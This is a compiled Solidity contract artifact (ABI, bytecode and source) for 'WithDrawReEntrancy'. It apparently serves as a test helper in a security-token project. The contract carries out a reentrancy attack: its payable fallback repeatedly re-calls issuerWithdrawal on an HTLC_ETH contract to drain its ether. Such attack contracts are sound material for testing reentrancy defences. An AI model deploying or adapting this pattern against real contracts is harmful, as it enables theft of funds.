{
  "contractName": "WithDrawReEntrancy",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_htlcEthAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [
        {
          "internalType": "bytes32",
          "name": "_swapID",
          "type": "bytes32"
        },
        {
          "internalType": "bytes32",
          "name": "_secretKey",
          "type": "bytes32"
        },
        {
          "internalType": "address",
          "name": "_securityToken",
          "type": "address"
        }
      ],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "balance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5060405161052d38038061052d833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b610416806101176000396000f3fe60806040526004361061002d5760003560e01c806394f29d4a1461012c578063b69ef8a8146101555761002e565b5b6702c68af0bb14000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311061012a5760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a70387ed600154600254600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518463ffffffff1660e01b81526004016100f7939291906102c5565b600060405180830381600087803b15801561011157600080fd5b505af1158015610125573d6000803e3d6000fd5b505050505b005b34801561013857600080fd5b50610153600480360381019061014e9190610359565b610180565b005b34801561016157600080fd5b5061016a610263565b60405161017791906103c5565b60405180910390f35b826001819055508160028190555080600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a70387ed8484846040518463ffffffff1660e01b815260040161022c939291906102c5565b600060405180830381600087803b15801561024657600080fd5b505af115801561025a573d6000803e3d6000fd5b50505050505050565b600047905090565b6000819050919050565b61027e8161026b565b82525050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006102af82610284565b9050919050565b6102bf816102a4565b82525050565b60006060820190506102da6000830186610275565b6102e76020830185610275565b6102f460408301846102b6565b949350505050565b600080fd5b61030a8161026b565b811461031557600080fd5b50565b60008135905061032781610301565b92915050565b610336816102a4565b811461034157600080fd5b50565b6000813590506103538161032d565b92915050565b600080600060608486031215610372576103716102fc565b5b600061038086828701610318565b935050602061039186828701610318565b92505060406103a286828701610344565b9150509250925092565b6000819050919050565b6103bf816103ac565b82525050565b60006020820190506103da60008301846103b6565b9291505056fea26469706673582212207adb9822e95312b765c784218e99889737f735e6750efc4792b65235ef29125264736f6c634300080a0033",
  "immutableReferences": {},
  "source": "pragma solidity 0.8.10;\n\nimport \"../htlc/HTLC_ETH.sol\";\n\n//  SPDX-License-Identifier: UNLICENSED\n\n\n\ncontract WithDrawReEntrancy {\n\n    HTLC_ETH htlcEth;\n\n    bytes32 id;\n    bytes32 secret;\n    address securityToken;\n\n    constructor(address _htlcEthAddress) {\n\n        htlcEth = HTLC_ETH(_htlcEthAddress);\n    }\n\n    //  contract recieving ether should have a fallback or receive function but payable\n   \n\n    fallback() external payable {\n\n        // attack implementation\n\n        if(address(htlcEth).balance >= 0.2 ether) {\n\n            htlcEth.issuerWithdrawal(id, secret, securityToken);\n           \n\n        }\n          \n    }\n\n    \n\n    function attack(bytes32 _swapID, bytes32 _secretKey, address _securityToken) external {\n        id = _swapID;\n        secret = _secretKey;\n        securityToken = _securityToken;\n\n        htlcEth.issuerWithdrawal(_swapID, _secretKey, _securityToken);\n        \n\n    }\n\n    function balance() external view returns (uint256) {\n        return address(this).balance;\n    }\n \n}\n\n\n\n",
  "sourcePath": "/Users/veteran/Documents/blockchain/Tangl/security-token/contracts/utils/WithdrawReEntrancy.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.10+commit.fc410830.Emscripten.clang"
  },
  "schemaVersion": "3.4.8",
  "updatedAt": "2022-09-11T13:57:42.383Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}